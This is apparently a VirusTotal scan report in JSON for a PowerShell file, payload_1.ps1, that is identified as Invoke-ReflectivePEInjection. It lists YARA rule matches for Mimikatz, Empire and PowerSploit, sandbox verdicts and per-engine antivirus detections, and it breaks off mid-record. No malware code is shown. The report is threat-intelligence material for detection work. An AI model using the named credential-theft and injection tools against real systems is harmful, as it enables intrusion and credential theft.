{
    "data":  {
                 "id":  "fb0f7c35a58a02473f26aabea4f682e2e483db84b606db2eca36aa6c7e7d9cf8",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/fb0f7c35a58a02473f26aabea4f682e2e483db84b606db2eca36aa6c7e7d9cf8"
                           },
                 "attributes":  {
                                    "tags":  [
                                                 "long-sleeps",
                                                 "powershell",
                                                 "detect-debug-environment"
                                             ],
                                    "crowdsourced_yara_results":  [
                                                                      {
                                                                          "ruleset_id":  "015dd811fe",
                                                                          "ruleset_version":  "015dd811fe|195c9611ddb90db599d7ffc1a9b0e8c45688007d",
                                                                          "ruleset_name":  "Windows_Hacktool_Mimikatz",
                                                                          "rule_name":  "Windows_Hacktool_Mimikatz_355d5d3a",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detection for Invoke-Mimikatz",
                                                                          "author":  "Elastic Security",
                                                                          "source":  "https://github.com/elastic/protections-artifacts"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000c7f4da2",
                                                                          "ruleset_version":  "000c7f4da2|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_powershell_empire",
                                                                          "rule_name":  "Empire_Invoke_Mimikatz",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Empire - a pure PowerShell post-exploitation agent - file Invoke-Mimikatz.ps1",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "0122a7f913",
                                                                          "ruleset_version":  "0122a7f913|589bbefc22847193cac455858fa15e627d671918",
                                                                          "ruleset_name":  "Windows_API_Function",
                                                                          "rule_name":  "Windows_API_Function",
                                                                          "match_date":  1766414751,
                                                                          "description":  "This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.",
                                                                          "author":  "InQuest Labs",
                                                                          "source":  "https://github.com/InQuest/yara-rules-vt"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "0005c1260b",
                                                                          "ruleset_version":  "0005c1260b|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_p0wnshell",
                                                                          "rule_name":  "Hacktool_Strings_p0wnedShell",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects strings found in Runspace Post Exploitation Toolkit",
                                                                          "author":  "Florian Roth",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000407dc1e",
                                                                          "ruleset_version":  "000407dc1e|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_empire",
                                                                          "rule_name":  "Empire_Invoke_CredentialInjection_Invoke_Mimikatz_Gen",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000407dc1e",
                                                                          "ruleset_version":  "000407dc1e|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_empire",
                                                                          "rule_name":  "Empire_PowerShell_Framework_Gen3",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects Empire component",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000407dc1e",
                                                                          "ruleset_version":  "000407dc1e|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_empire",
                                                                          "rule_name":  "Empire_Invoke_Gen",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000407dc1e",
                                                                          "ruleset_version":  "000407dc1e|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_empire",
                                                                          "rule_name":  "Empire_PowerShell_Framework_Gen5",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects Empire component",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "0005605c57",
                                                                          "ruleset_version":  "0005605c57|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_powershell_toolkit",
                                                                          "rule_name":  "ps1_toolkit_Invoke_Mimikatz_RelfectivePEInjection",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Auto-generated rule - from files Invoke-Mimikatz.ps1, Invoke-RelfectivePEInjection.ps1",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "0005f74117",
                                                                          "ruleset_version":  "0005f74117|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_invoke_mimikatz",
                                                                          "rule_name":  "Invoke_Mimikatz",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects Invoke-Mimikatz String",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000f4d099b",
                                                                          "ruleset_version":  "000f4d099b|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_mimikatz",
                                                                          "rule_name":  "power_pe_injection",
                                                                          "match_date":  1766414751,
                                                                          "description":  "PowerShell with PE Reflective Injection",
                                                                          "author":  "Benjamin DELPY (gentilkiwi)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "0001fae807",
                                                                          "ruleset_version":  "0001fae807|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_powershell_susp",
                                                                          "rule_name":  "SUSP_PowerShell_String_K32_RemProcess",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects suspicious PowerShell code that uses Kernel32, RemoteProccess handles or shellcode",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000407dc1e",
                                                                          "ruleset_version":  "000407dc1e|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_empire",
                                                                          "rule_name":  "Empire_PowerShell_Framework_Gen1",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects Empire component",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000407dc1e",
                                                                          "ruleset_version":  "000407dc1e|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_empire",
                                                                          "rule_name":  "Empire_PowerShell_Framework_Gen2",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects Empire component",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "000407dc1e",
                                                                          "ruleset_version":  "000407dc1e|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_empire",
                                                                          "rule_name":  "Empire_PowerShell_Framework_Gen4",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Detects Empire component",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      },
                                                                      {
                                                                          "ruleset_id":  "0005605c57",
                                                                          "ruleset_version":  "0005605c57|1d926845269a3ac8de0431da133950390b5cced3",
                                                                          "ruleset_name":  "gen_powershell_toolkit",
                                                                          "rule_name":  "ps1_toolkit_Invoke_Mimikatz",
                                                                          "match_date":  1766414751,
                                                                          "description":  "Auto-generated rule - file Invoke-Mimikatz.ps1",
                                                                          "author":  "Florian Roth (Nextron Systems)",
                                                                          "source":  "https://github.com/Neo23x0/signature-base"
                                                                      }
                                                                  ],
                                    "meaningful_name":  "payload_1.ps1",
                                    "names":  [
                                                  "payload_1.ps1",
                                                  "Invoke-ReflectivePEInjection.ps1"
                                              ],
                                    "type_extension":  "ps1",
                                    "vhash":  "3af563e3b981fed22f3b5dd73f63985a",
                                    "total_votes":  {
                                                        "harmless":  0,
                                                        "malicious":  2
                                                    },
                                    "last_analysis_date":  1765819838,
                                    "sigma_analysis_stats":  {
                                                                 "critical":  0,
                                                                 "high":  2,
                                                                 "medium":  4,
                                                                 "low":  1
                                                             },
                                    "last_modification_date":  1766414751,
                                    "threat_severity":  {
                                                            "version":  5,
                                                            "threat_severity_level":  "SEVERITY_HIGH",
                                                            "threat_severity_data":  {
                                                                                         "popular_threat_category":  "trojan",
                                                                                         "num_gav_detections":  3,
                                                                                         "belongs_to_bad_collection":  true
                                                                                     },
                                                            "last_analysis_date":  "1757317811",
                                                            "level_description":  "Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes."
                                                        },
                                    "last_submission_date":  1747143312,
                                    "sandbox_verdicts":  {
                                                             "Zenbox":  {
                                                                            "category":  "malicious",
                                                                            "malware_classification":  [
                                                                                                           "MALWARE",
                                                                                                           "TROJAN",
                                                                                                           "EVADER"
                                                                                                       ],
                                                                            "sandbox_name":  "Zenbox",
                                                                            "malware_names":  [
                                                                                                  "PowerSploit",
                                                                                                  "Metasploit"
                                                                                              ],
                                                                            "confidence":  84
                                                                        },
                                                             "C2AE":  {
                                                                          "category":  "undetected",
                                                                          "malware_classification":  [
                                                                                                         "UNKNOWN_VERDICT"
                                                                                                     ],
                                                                          "sandbox_name":  "C2AE"
                                                                      }
                                                         },
                                    "sha1":  "d46c7a81fe3ab37f993abc9b5077e3be5b09a6fb",
                                    "last_analysis_results":  {
                                                                  "Bkav":  {
                                                                               "method":  "blacklist",
                                                                               "engine_name":  "Bkav",
                                                                               "engine_version":  "2.0.0.1",
                                                                               "engine_update":  "20251215",
                                                                               "category":  "undetected",
                                                                               "result":  null
                                                                           },
                                                                  "Lionic":  {
                                                                                 "method":  "blacklist",
                                                                                 "engine_name":  "Lionic",
                                                                                 "engine_version":  "8.16",
                                                                                 "engine_update":  "20251215",
                                                                                 "category":  "malicious",
                                                                                 "result":  "Trojan.Script.PowerSploit.4!c"
                                                                             },
                                                                  "MicroWorld-eScan":  {
                                                                                           "method":  "blacklist",
                                                                                           "engine_name":  "MicroWorld-eScan",
                                                                                           "engine_version":  "14.0.409.0",
                                                                                           "engine_update":  "20251215",
                                                                                           "category":  "malicious",
                                                                                           "result":  "Application.HackTool.PowerSploit.A"
                                                                                       },
                                                                  "ClamAV":  {
                                                                                 "method":  "blacklist",
                                                                                 "engine_name":  "ClamAV",
                                                                                 "engine_version":  "1.5.1.0",
                                                                                 "engine_update":  "20251215",
                                                                                 "category":  "malicious",
                                                                                 "result":  "Win.Exploit.PowerSploit-6983656-2"
                                                                             },
                                                                  "CTX":  {
                                                                              "method":  "blacklist",
                                                                              "engine_name":  "CTX",
                                                                              "engine_version":  "2024.8.29.1",
                                                                              "engine_update":  "20251215",
                                                                              "category":  "malicious",
                                                                              "result":  "powershell.trojan.powersploit"
                                                                          },
                                                                  "CAT-QuickHeal":  {
                                                                                        "method":  "blacklist",
                                                                                        "engine_name":  "CAT-QuickHeal",
                                                                                        "engine_version":  "22.00",
                                                                                        "engine_update":  "20251214",
                                                                                        "category":  "undetected",
                                                                                        "result":  null
                                                                                    },
                                                                  "Skyhigh":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Skyhigh",
                                                                                  "engine_version":  "v2021.2.0+4045",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "malicious",
                                                                                  "result":  "BehavesLike.PS.Dropper.cn"
                                                                              },
                                                                  "ALYac":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "ALYac",
                                                                                "engine_version":  "2.0.0.10",
                                                                                "engine_update":  "20251215",
                                                                                "category":  "malicious",
                                                                                "result":  "Trojan.PowerShell.Agent"
                                                                            },
                                                                  "Malwarebytes":  {
                                                                                       "method":  "blacklist",
                                                                                       "engine_name":  "Malwarebytes",
                                                                                       "engine_version":  "3.1.0.181",
                                                                                       "engine_update":  "20251215",
                                                                                       "category":  "undetected",
                                                                                       "result":  null
                                                                                   },
                                                                  "VIPRE":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "VIPRE",
                                                                                "engine_version":  "6.0.0.35",
                                                                                "engine_update":  "20251215",
                                                                                "category":  "malicious",
                                                                                "result":  "Application.HackTool.PowerSploit.A"
                                                                            },
                                                                  "Sangfor":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Sangfor",
                                                                                  "engine_version":  "2.22.3.0",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "malicious",
                                                                                  "result":  "Trojan.Generic-PS.Save.6033e164"
                                                                              },
                                                                  "K7AntiVirus":  {
                                                                                      "method":  "blacklist",
                                                                                      "engine_name":  "K7AntiVirus",
                                                                                      "engine_version":  "14.23.57989",
                                                                                      "engine_update":  "20251215",
                                                                                      "category":  "undetected",
                                                                                      "result":  null
                                                                                  },
                                                                  "K7GW":  {
                                                                               "method":  "blacklist",
                                                                               "engine_name":  "K7GW",
                                                                               "engine_version":  "14.24.57988",
                                                                               "engine_update":  "20251215",
                                                                               "category":  "undetected",
                                                                               "result":  null
                                                                           },
                                                                  "CrowdStrike":  {
                                                                                      "method":  "blacklist",
                                                                                      "engine_name":  "CrowdStrike",
                                                                                      "engine_version":  "1.0",
                                                                                      "engine_update":  "20231026",
                                                                                      "category":  "undetected",
                                                                                      "result":  null
                                                                                  },
                                                                  "Baidu":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "Baidu",
                                                                                "engine_version":  "1.0.0.2",
                                                                                "engine_update":  "20190318",
                                                                                "category":  "undetected",
                                                                                "result":  null
                                                                            },
                                                                  "VirIT":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "VirIT",
                                                                                "engine_version":  "9.5.1105",
                                                                                "engine_update":  "20251215",
                                                                                "category":  "malicious",
                                                                                "result":  "Trojan.PS.RflctvLdr.DHI"
                                                                            },
                                                                  "Symantec":  {
                                                                                   "method":  "blacklist",
                                                                                   "engine_name":  "Symantec",
                                                                                   "engine_version":  "1.22.0.0",
                                                                                   "engine_update":  "20251215",
                                                                                   "category":  "malicious",
                                                                                   "result":  "Hacktool.Mimikatz"
                                                                               },
                                                                  "ESET-NOD32":  {
                                                                                     "method":  "blacklist",
                                                                                     "engine_name":  "ESET-NOD32",
                                                                                     "engine_version":  "18.2.18.0",
                                                                                     "engine_update":  "20251215",
                                                                                     "category":  "malicious",
                                                                                     "result":  "PowerShell/Agent.ASP trojan"
                                                                                 },
                                                                  "TrendMicro-HouseCall":  {
                                                                                               "method":  "blacklist",
                                                                                               "engine_name":  "TrendMicro-HouseCall",
                                                                                               "engine_version":  "24.550.0.1002",
                                                                                               "engine_update":  "20251215",
                                                                                               "category":  "malicious",
                                                                                               "result":  "Trojan.PS1.POWERSPLOIT.SM"
                                                                                           },
                                                                  "Avast":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "Avast",
                                                                                "engine_version":  "23.9.8494.0",
                                                                                "engine_update":  "20251222",
                                                                                "category":  "malicious",
                                                                                "result":  "BV:AndroDrp-B [Drp]"
                                                                            },
                                                                  "Cynet":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "Cynet",
                                                                                "engine_version":  "4.0.3.4",
                                                                                "engine_update":  "20251215",
                                                                                "category":  "malicious",
                                                                                "result":  "Malicious (score: 99)"
                                                                            },
                                                                  "Kaspersky":  {
                                                                                    "method":  "blacklist",
                                                                                    "engine_name":  "Kaspersky",
                                                                                    "engine_version":  "22.0.1.28",
                                                                                    "engine_update":  "20251222",
                                                                                    "category":  "malicious",
                                                                                    "result":  "HEUR:Trojan.PowerShell.Agent.gen"
                                                                                },
                                                                  "BitDefender":  {
                                                                                      "method":  "blacklist",
                                                                                      "engine_name":  "BitDefender",
                                                                                      "engine_version":  "7.2",
                                                                                      "engine_update":  "20251215",
                                                                                      "category":  "malicious",
                                                                                      "result":  "Application.HackTool.PowerSploit.A"
                                                                                  },
                                                                  "NANO-Antivirus":  {
                                                                                         "method":  "blacklist",
                                                                                         "engine_name":  "NANO-Antivirus",
                                                                                         "engine_version":  "1.0.170.26895",
                                                                                         "engine_update":  "20251215",
                                                                                         "category":  "malicious",
                                                                                         "result":  "Trojan.Script.ExpKit.eydujq"
                                                                                     },
                                                                  "ViRobot":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "ViRobot",
                                                                                  "engine_version":  "2014.3.20.0",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "undetected",
                                                                                  "result":  null
                                                                              },
                                                                  "Tencent":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Tencent",
                                                                                  "engine_version":  "1.0.0.1",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "malicious",
                                                                                  "result":  "Win32.Trojan.Agent.Yfow"
                                                                              },
                                                                  "Emsisoft":  {
                                                                                   "method":  "blacklist",
                                                                                   "engine_name":  "Emsisoft",
                                                                                   "engine_version":  "2024.8.0.61147",
                                                                                   "engine_update":  "20251215",
                                                                                   "category":  "malicious",
                                                                                   "result":  "Application.HackTool.PowerSploit.A (B)"
                                                                               },
                                                                  "F-Secure":  {
                                                                                   "method":  "blacklist",
                                                                                   "engine_name":  "F-Secure",
                                                                                   "engine_version":  "18.10.1547.307",
                                                                                   "engine_update":  "20251215",
                                                                                   "category":  "malicious",
                                                                                   "result":  "Trojan.TR/PSploit.G"
                                                                               },
                                                                  "DrWeb":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "DrWeb",
                                                                                "engine_version":  "7.0.72.9030",
                                                                                "engine_update":  "20251222",
                                                                                "category":  "malicious",
                                                                                "result":  "Tool.Inject.72"
                                                                            },
                                                                  "Zillya":  {
                                                                                 "method":  "blacklist",
                                                                                 "engine_name":  "Zillya",
                                                                                 "engine_version":  "2.0.0.5506",
                                                                                 "engine_update":  "20251215",
                                                                                 "category":  "undetected",
                                                                                 "result":  null
                                                                             },
                                                                  "TrendMicro":  {
                                                                                     "method":  "blacklist",
                                                                                     "engine_name":  "TrendMicro",
                                                                                     "engine_version":  "24.550.0.1002",
                                                                                     "engine_update":  "20251215",
                                                                                     "category":  "malicious",
                                                                                     "result":  "Trojan.PS1.POWERSPLOIT.SM"
                                                                                 },
                                                                  "McAfeeD":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "McAfeeD",
                                                                                  "engine_version":  "1.2.0.10275",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "undetected",
                                                                                  "result":  null
                                                                              },
                                                                  "CMC":  {
                                                                              "method":  "blacklist",
                                                                              "engine_name":  "CMC",
                                                                              "engine_version":  "2.4.2022.1",
                                                                              "engine_update":  "20251208",
                                                                              "category":  "undetected",
                                                                              "result":  null
                                                                          },
                                                                  "Sophos":  {
                                                                                 "method":  "blacklist",
                                                                                 "engine_name":  "Sophos",
                                                                                 "engine_version":  "3.3.1.0",
                                                                                 "engine_update":  "20251215",
                                                                                 "category":  "malicious",
                                                                                 "result":  "ATK/PowSploit-C"
                                                                             },
                                                                  "huorong":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "huorong",
                                                                                  "engine_version":  "99567f5:99567f5:201708b:201708b",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "malicious",
                                                                                  "result":  "HackTool/Meterpreter.d"
                                                                              },
                                                                  "Jiangmin":  {
                                                                                   "method":  "blacklist",
                                                                                   "engine_name":  "Jiangmin",
                                                                                   "engine_version":  "16.0.100",
                                                                                   "engine_update":  "20251214",
                                                                                   "category":  "undetected",
                                                                                   "result":  null
                                                                               },
                                                                  "Google":  {
                                                                                 "method":  "blacklist",
                                                                                 "engine_name":  "Google",
                                                                                 "engine_version":  "1765810854",
                                                                                 "engine_update":  "20251215",
                                                                                 "category":  "malicious",
                                                                                 "result":  "Detected"
                                                                             },
                                                                  "Avira":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "Avira",
                                                                                "engine_version":  "8.3.3.24",
                                                                                "engine_update":  "20251215",
                                                                                "category":  "malicious",
                                                                                "result":  "TR/PSploit.G"
                                                                            },
                                                                  "Antiy-AVL":  {
                                                                                    "method":  "blacklist",
                                                                                    "engine_name":  "Antiy-AVL",
                                                                                    "engine_version":  "3.0",
                                                                                    "engine_update":  "20251215",
                                                                                    "category":  "undetected",
                                                                                    "result":  null
                                                                                },
                                                                  "Kingsoft":  {
                                                                                   "method":  "blacklist",
                                                                                   "engine_name":  "Kingsoft",
                                                                                   "engine_version":  "None",
                                                                                   "engine_update":  "20251215",
                                                                                   "category":  "malicious",
                                                                                   "result":  "Script.Troj.powershell.2052359"
                                                                               },
                                                                  "Microsoft":  {
                                                                                    "method":  "blacklist",
                                                                                    "engine_name":  "Microsoft",
                                                                                    "engine_version":  "1.1.25110.1",
                                                                                    "engine_update":  "20251215",
                                                                                    "category":  "malicious",
                                                                                    "result":  "Trojan:PowerShell/Powersploit.J"
                                                                                },
                                                                  "Gridinsoft":  {
                                                                                     "method":  "blacklist",
                                                                                     "engine_name":  "Gridinsoft",
                                                                                     "engine_version":  "1.0.231.174",
                                                                                     "engine_update":  "20251215",
                                                                                     "category":  "undetected",
                                                                                     "result":  null
                                                                                 },
                                                                  "Xcitium":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Xcitium",
                                                                                  "engine_version":  "38266",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "malicious",
                                                                                  "result":  "TrojWare.Script.Injector.B@81qbmy"
                                                                              },
                                                                  "Arcabit":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Arcabit",
                                                                                  "engine_version":  "2025.0.0.23",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "malicious",
                                                                                  "result":  "Application.HackTool.PowerSploit.A"
                                                                              },
                                                                  "SUPERAntiSpyware":  {
                                                                                           "method":  "blacklist",
                                                                                           "engine_name":  "SUPERAntiSpyware",
                                                                                           "engine_version":  "5.6.0.1032",
                                                                                           "engine_update":  "20251214",
                                                                                           "category":  "undetected",
                                                                                           "result":  null
                                                                                       },
                                                                  "ZoneAlarm":  {
                                                                                    "method":  "blacklist",
                                                                                    "engine_name":  "ZoneAlarm",
                                                                                    "engine_version":  "6.21-110947153",
                                                                                    "engine_update":  "20251215",
                                                                                    "category":  "malicious",
                                                                                    "result":  "ATK/PowSploit-C"
                                                                                },
                                                                  "GData":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "GData",
                                                                                "engine_version":  "GD:27.42879AVA:64.30332",
                                                                                "engine_update":  "20251215",
                                                                                "category":  "malicious",
                                                                                "result":  "Application.HackTool.PowerSploit.A"
                                                                            },
                                                                  "Varist":  {
                                                                                 "method":  "blacklist",
                                                                                 "engine_name":  "Varist",
                                                                                 "engine_version":  "6.6.1.3",
                                                                                 "engine_update":  "20251215",
                                                                                 "category":  "malicious",
                                                                                 "result":  "PSH/Mimikatz.C"
                                                                             },
                                                                  "AhnLab-V3":  {
                                                                                    "method":  "blacklist",
                                                                                    "engine_name":  "AhnLab-V3",
                                                                                    "engine_version":  "3.29.1.10604",
                                                                                    "engine_update":  "20251215",
                                                                                    "category":  "malicious",
                                                                                    "result":  "Trojan/PowerShell.ReflectiveLdr.S1483"
                                                                                },
                                                                  "Acronis":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Acronis",
                                                                                  "engine_version":  "1.2.0.121",
                                                                                  "engine_update":  "20240328",
                                                                                  "category":  "undetected",
                                                                                  "result":  null
                                                                              },
                                                                  "VBA32":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "VBA32",
                                                                                "engine_version":  "5.5.0",
                                                                                "engine_update":  "20251215",
                                                                                "category":  "undetected",
                                                                                "result":  null
                                                                            },
                                                                  "TACHYON":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "TACHYON",
                                                                                  "engine_version":  "2025-12-15.02",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "undetected",
                                                                                  "result":  null
                                                                              },
                                                                  "Zoner":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "Zoner",
                                                                                "engine_version":  "2.2.2.0",
                                                                                "engine_update":  "20251215",
                                                                                "category":  "undetected",
                                                                                "result":  null
                                                                            },
                                                                  "Rising":  {
                                                                                 "method":  "blacklist",
                                                                                 "engine_name":  "Rising",
                                                                                 "engine_version":  "25.0.0.28",
                                                                                 "engine_update":  "20251222",
                                                                                 "category":  "malicious",
                                                                                 "result":  "Trojan.Injector/PS!9.1A1CA (XSE:WFNFX1ZCUzrugg6WDMVvGBK4P02QEipO)"
                                                                             },
                                                                  "Yandex":  {
                                                                                 "method":  "blacklist",
                                                                                 "engine_name":  "Yandex",
                                                                                 "engine_version":  "5.5.2.24",
                                                                                 "engine_update":  "20251215",
                                                                                 "category":  "undetected",
                                                                                 "result":  null
                                                                             },
                                                                  "TrellixENS":  {
                                                                                     "method":  "blacklist",
                                                                                     "engine_name":  "TrellixENS",
                                                                                     "engine_version":  "6.0.6.653",
                                                                                     "engine_update":  "20251215",
                                                                                     "category":  "malicious",
                                                                                     "result":  "Htool-ReflectivePEInject"
                                                                                 },
                                                                  "Ikarus":  {
                                                                                 "method":  "blacklist",
                                                                                 "engine_name":  "Ikarus",
                                                                                 "engine_version":  "6.4.16.0",
                                                                                 "engine_update":  "20251215",
                                                                                 "category":  "malicious",
                                                                                 "result":  "HackTool.PS.Mimikatz"
                                                                             },
                                                                  "MaxSecure":  {
                                                                                    "method":  "blacklist",
                                                                                    "engine_name":  "MaxSecure",
                                                                                    "engine_version":  "1.0.0.1",
                                                                                    "engine_update":  "20251215",
                                                                                    "category":  "undetected",
                                                                                    "result":  null
                                                                                },
                                                                  "Fortinet":  {
                                                                                   "method":  "blacklist",
                                                                                   "engine_name":  "Fortinet",
                                                                                   "engine_version":  "7.0.30.0",
                                                                                   "engine_update":  "20251215",
                                                                                   "category":  "malicious",
                                                                                   "result":  "PowerShell/NetWalker.T!tr"
                                                                               },
                                                                  "AVG":  {
                                                                              "method":  "blacklist",
                                                                              "engine_name":  "AVG",
                                                                              "engine_version":  "23.9.8494.0",
                                                                              "engine_update":  "20251222",
                                                                              "category":  "malicious",
                                                                              "result":  "BV:AndroDrp-B [Drp]"
                                                                          },
                                                                  "Panda":  {
                                                                                "method":  "blacklist",
                                                                                "engine_name":  "Panda",
                                                                                "engine_version":  "4.6.4.2",
                                                                                "engine_update":  "20251215",
                                                                                "category":  "undetected",
                                                                                "result":  null
                                                                            },
                                                                  "alibabacloud":  {
                                                                                       "method":  "blacklist",
                                                                                       "engine_name":  "alibabacloud",
                                                                                       "engine_version":  "2.2.0",
                                                                                       "engine_update":  "20250321",
                                                                                       "category":  "malicious",
                                                                                       "result":  "Trojan:Win/Powersploit.J"
                                                                                   },
                                                                  "google_safebrowsing":  {
                                                                                              "method":  "blacklist",
                                                                                              "engine_name":  "google_safebrowsing",
                                                                                              "engine_version":  "1.0",
                                                                                              "engine_update":  "20251215",
                                                                                              "category":  "undetected",
                                                                                              "result":  null
                                                                                          },
                                                                  "Avast-Mobile":  {
                                                                                       "method":  "blacklist",
                                                                                       "engine_name":  "Avast-Mobile",
                                                                                       "engine_version":  "251215-06",
                                                                                       "engine_update":  "20251215",
                                                                                       "category":  "type-unsupported",
                                                                                       "result":  null
                                                                                   },
                                                                  "SymantecMobileInsight":  {
                                                                                                "method":  "blacklist",
                                                                                                "engine_name":  "SymantecMobileInsight",
                                                                                                "engine_version":  "2.0",
                                                                                                "engine_update":  "20250124",
                                                                                                "category":  "type-unsupported",
                                                                                                "result":  null
                                                                                            },
                                                                  "BitDefenderFalx":  {
                                                                                          "method":  "blacklist",
                                                                                          "engine_name":  "BitDefenderFalx",
                                                                                          "engine_version":  "2.0.936",
                                                                                          "engine_update":  "20251208",
                                                                                          "category":  "type-unsupported",
                                                                                          "result":  null
                                                                                      },
                                                                  "DeepInstinct":  {
                                                                                       "method":  "blacklist",
                                                                                       "engine_name":  "DeepInstinct",
                                                                                       "engine_version":  "5.0.0.8",
                                                                                       "engine_update":  "20251214",
                                                                                       "category":  "type-unsupported",
                                                                                       "result":  null
                                                                                   },
                                                                  "Elastic":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Elastic",
                                                                                  "engine_version":  "4.0.241",
                                                                                  "engine_update":  "20251209",
                                                                                  "category":  "type-unsupported",
                                                                                  "result":  null
                                                                              },
                                                                  "Webroot":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Webroot",
                                                                                  "engine_version":  "1.9.0.8",
                                                                                  "engine_update":  "20250227",
                                                                                  "category":  "type-unsupported",
                                                                                  "result":  null
                                                                              },
                                                                  "APEX":  {
                                                                               "method":  "blacklist",
                                                                               "engine_name":  "APEX",
                                                                               "engine_version":  "6.725",
                                                                               "engine_update":  "20251213",
                                                                               "category":  "type-unsupported",
                                                                               "result":  null
                                                                           },
                                                                  "Paloalto":  {
                                                                                   "method":  "blacklist",
                                                                                   "engine_name":  "Paloalto",
